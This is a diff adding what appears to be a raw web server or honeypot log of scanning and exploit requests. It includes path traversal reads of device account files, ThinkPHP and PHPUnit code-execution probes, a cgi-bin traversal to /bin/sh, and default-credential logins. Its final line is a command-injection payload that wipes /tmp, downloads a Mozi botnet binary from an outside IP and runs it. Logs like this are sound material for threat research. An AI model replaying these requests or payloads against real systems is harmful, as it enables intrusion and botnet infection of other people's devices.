@@ -1,0 +1,56 @@
+
+
+
+GET /data/search?q=Seoul%20National%20University&user=admin HTTP/1.1
+GET /data/save_data?q=&user=admin HTTP/1.1
+GET /data/load_data?q=&user=admin HTTP/1.1
+GET /data/load_acc?q=&user=admin HTTP/1.1
+GET /data/load_log?q=&user=admin HTTP/1.1
+GET http://pingjs.qq.com/ping.js HTTP/1.1
+POST http://47.103.110.151:16750/ HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+GET /../../mnt/mtd/Config/Account1 HTTP/1.1
+GET http://pingjs.qq.com/ping.js HTTP/1.1
+POST http://47.103.110.151:16750/ HTTP/1.1
+GET /../../mnt/mtd/Config/Account2 HTTP/1.1
+GET http://checkip.dyndns.org/ HTTP/1.1
+GET http://pingjs.qq.com/ping.js HTTP/1.1
+POST http://47.103.110.151:16750/ HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+GET /manager/text/list HTTP/1.1
+GET /.well-known/security.txt HTTP/1.1
+GET http://pingjs.qq.com/ping.js HTTP/1.1
+POST http://47.103.110.151:16750/ HTTP/1.1
+GET /manager/html HTTP/1.1
+POST /cgi-bin/webctrl.cgi HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+PUT /SDK/webLanguage HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+POST /cgi-bin/webctrl.cgi HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+GET http://pingjs.qq.com/ping.js HTTP/1.1
+POST http://47.103.110.151:16750/ HTTP/1.1
+GET http://checkip.dyndns.org/ HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+POST /cgi-bin/webctrl.cgi HTTP/1.1
+POST /cgi-bin/webctrl.cgi HTTP/1.1
+GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0
+POST /goform/set_LimitClient_cfg HTTP/1.1
+GET /actuator/gateway/routes HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+GET /w/home.asp HTTP/1.1
+GET /securityRealm/user/admin/search/index?q=a HTTP/1.1
+POST /Autodiscover/Autodiscover.xml HTTP/1.1
+POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1
+POST /mifs/.;/services/LogService HTTP/1.1
+GET /_ignition/execute-solution HTTP/1.1
+GET /config/getuser?index=0 HTTP/1.1
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+POST /goform/set_LimitClient_cfg HTTP/1.1
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://27.21.158.251:49718/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
